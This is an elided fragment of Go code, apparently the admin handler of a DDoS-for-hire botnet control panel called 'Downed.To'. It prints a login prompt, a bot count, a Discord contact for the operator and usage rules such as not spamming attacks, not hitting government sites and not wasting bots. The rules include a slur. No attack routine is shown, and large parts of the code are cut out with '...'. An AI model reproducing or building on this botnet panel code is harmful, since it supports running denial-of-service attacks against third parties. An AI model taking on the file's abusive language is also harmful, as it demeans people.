...
func (this *Admin) Handle() {
    ...
    this.conn.Write([]byte("\033[01;31mDowned.To\033[01;31m | Security clearance required\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;31mClient ID\033[\033[01;37m: \033[01;37m"))
    ...
    for {
        ...
        if err != nil || cmd == "c" || cmd == "cls" || cmd == "clear" { // clear screen 
            ...
            this.conn.Write([]byte("\033[37m    Welcome To Downed.To              \r\n"))
            this.conn.Write([]byte("\033[37m      Don't Fucking Spam Attacks...\r\n"))
            this.conn.Write([]byte("\033[37m        Don't Fucking Share Logins!\r\n"))
            this.conn.Write([]byte("\033[1;31m        Don't Hit Government Sites...\r\n"))
            this.conn.Write([]byte("\033[37m             Don't waste my bots on retards! ”\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        ...
        botCount = clientList.Count()
            ...
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mContact Discord: \033[01;37mIpDowned#7510       \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;37m ═══════════════════════════════  \r\n")))
            continue
        }
